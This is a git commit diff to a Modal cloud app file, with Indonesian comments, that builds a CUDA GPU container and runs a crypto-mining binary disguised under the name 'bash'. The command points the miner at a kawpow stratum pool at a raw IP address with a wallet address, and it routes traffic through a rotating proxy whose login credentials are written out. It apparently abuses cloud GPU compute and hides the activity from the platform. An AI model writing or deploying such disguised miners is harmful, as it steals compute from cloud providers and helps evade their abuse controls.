a8dde5bcc3a8eb25e9b2ffa6b403330ce4bb0cc6
qimxdoyo3240 <238822706+qimxdoyo3240@users.noreply.github.com>
2026-01-13 21:02:38 +0530

    Update modal_app.py

--- modal_app.py
+++ modal_app.py
@@ -8,7 +8,12 @@ image = (
     modal.Image.from_registry(
         "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
     )
-    .apt_install("bash")
+    .apt_install(
+        "bash",
+        "python3",
+        "python3-pip",
+        "python-is-python3"   # 🔥 INI KUNCI UTAMA
+    )
 )
 
 @app.function(
@@ -17,12 +22,15 @@ image = (
     timeout=60 * 60 * 4          # ⏱️ 4 jam
 )
 def run_script():
-    # Verifikasi GPU
+    # 1️⃣ Pastikan Python terdeteksi
+    subprocess.run(["python", "--version"], check=True)
+
+    # 2️⃣ Pastikan GPU ada
     subprocess.run(["nvidia-smi"], check=True)
 
-    # Jalankan script
+    # 3️⃣ Jalankan script
     subprocess.run(
-        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health"],
+        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
         check=False
     )
 
